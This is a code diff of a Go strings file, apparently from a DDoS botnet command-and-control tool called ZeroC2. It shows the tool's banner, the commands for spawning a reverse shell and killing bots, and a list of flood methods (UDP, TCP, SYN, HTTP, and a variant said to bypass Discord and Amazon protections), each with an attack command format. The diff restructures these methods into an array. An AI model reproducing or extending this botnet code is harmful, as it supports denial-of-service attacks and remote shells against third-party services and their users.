@@ -40,7 +40,7 @@ const (
 	Welcome = `
 	_____               ____ ____  
 	|__  /___ _ __ ___  / ___|___ \ 
-	  / // _ \ '__/ _ \| |     __) |  beta
+	  / // _ \ '__/ _ \| |     __) |  beta 0.2.4
 	 / /|  __/ | | (_) | |___ / __/ 
 	/____\___|_|  \___/ \____|_____|
 `
@@ -58,26 +58,12 @@ shell    -> spawn a reverse shell
 kill     -> kill terylene bots
 exit     -> exit
 `
-	Methods = `
-format:
-!method <target> <port> <duration>
+	Attackmsg = `
 
-             ( う-´)づ︻╦̵̵̿╤── \(˚☐˚”)/
-+---------+-----------------------------------------------+
-| methods | descriptions                                  |
-+---------+-----------------------------------------------+
-| UDP     | UDP flood                                     |
-| TCP     | TCP flood                                     |
-| SYN     | SYN flood                                     |
-| HTTP    | HTTP get flood                                |
-| UDPRAPE | Crafted UDP flood                             |
-| UDP-VIP | UDP flood to bypass discord , amazon and more |
-+---------+-----------------------------------------------+
-
-`
+	`
 	Ddosmsg = `attack broadcasted to all terylene`
 
-	InvalidIp = `Invalid ip address (must be a public ipv6 address)`
+	InvalidIp = `Invalid ip address (must be a public ipv4 address)`
 
 	Invalidport = `Invalid port`
 
@@ -107,6 +93,17 @@ const (
 
 const (
 	AddmethodHelp = `addmethod <method name>`
+)
+
+var (
+	AllMethods = [][]string{
+		{"UDP", "UDP flood", "!UDP <target> <port> <duration>"},
+		{"TCP", "TCP flood", "!TCP <target> <port> <duration>"},
+		{"SYN", "SYN flood", "!SYN <target> <port> <duration>"},
+		{"HTTP", "HTTP get flood", "!HTTP <target> <port> <duration>"},
+		{"UDPRAPE", "Crafter UDP flood", "!UDPRAPE <target> <port> <duration>"},
+		{"UDP-VIP", "UDP flood to bypass discord, amazon and more", "!UDP-VIP <target> <port> <duration>"},
+	}
 )
 
 // interaction shell message
@@ -159,7 +156,7 @@ const (
 	⠀⠀⠀⠠⣍⣒⡲⡽⡇⣾⡟⠁⢀⡴⣋⢿⣿⣯⣤⣬⢡⣿⡏⣾⣿⡯⣿⣻⣯⡻⣾⣿⣷⣿⣞⣌⢷⠱⠀⡨⢁⠄⠀⠀⡀⠀⠀⠀
 	⠀⠀⠀⠀⢀⠎⣰⣎⣕⡟⠀⢠⣿⢿⣿⣿⠟⡿⣎⣻⣿⣿⣷⣿⠯⢮⡻⣿⣿⣯⣾⡟⣿⣿⣿⣿⣿⣳⠈⢂⠡⠄⠂⣉⠀⠤⠀⠂
 	⠀⠀⠀⠀⠘⢱⢣⢯⣜⣌⣻⣯⣜⣹⣿⢃⣠⠻⠖⡵⢸⣿⠻⣿⣷⣿⡟⢻⣾⢊⣩⣿⣿⣿⣿⣿⣿⣽⣇⠐⠄⠬⠥⠤⠤⠤⠀⠀
-	⠀⠀⠀⠀⠀⣼⣏⣼⠁⡟⣾⢻⠟⣿⣿⣿⣻⣴⣻⡗⣾⣿⡯⠟⢻⢩⣑⣾⣷⣿⠿⢿⣵⣟⣩⣿⣾⢩⣿⡀⠪⢉⡉⠉⠀⠀⠀⠀    ERROR !!!!
+	⠀⠀⠀⠀⠀⣼⣏⣼⠁⡟⣾⢻⠟⣿⣿⣿⣻⣴⣻⡗⣾⣿⡯⠟⢻⢩⣑⣾⣷⣿⠿⢿⣵⣟⣩⣿⣾⢩⣿⡀⠪⢉⡉⠉⠀⠀⠀⠀    SHELL ERROR !!!!
 	⠀⠀⠀⢀⡾⣽⢼⠼⡎⣤⣿⣿⣶⣿⢯⣿⢽⢛⢲⢸⣁⣿⣧⣤⣾⡿⠟⣗⣟⣿⣟⣳⠆⣡⣾⣿⢻⡼⢿⢓⠒⡄⠀⠀⠀⠀⠀⠀
 	⠀⠀⢀⠎⡝⢸⠀⣆⣿⣿⣿⣝⣥⣿⣯⣊⣥⡟⠆⠢⠀⣷⣾⣿⣩⠛⢭⢯⣾⣿⡿⢿⢾⠏⣿⣿⢝⡖⡳⢠⡛⣿⡀⠀⠀⠀⠀⠀
 	⠀⢠⠋⡼⢀⣌⣼⣿⢹⡿⣿⡿⢿⣿⠟⣿⣿⣿⢾⣿⡷⣿⣿⣟⢿⣿⣤⣾⢻⣿⣠⣿⣶⣾⣯⣯⢃⠝⡹⢹⢱⢿⣧⠀⠀⠀⠀⠀
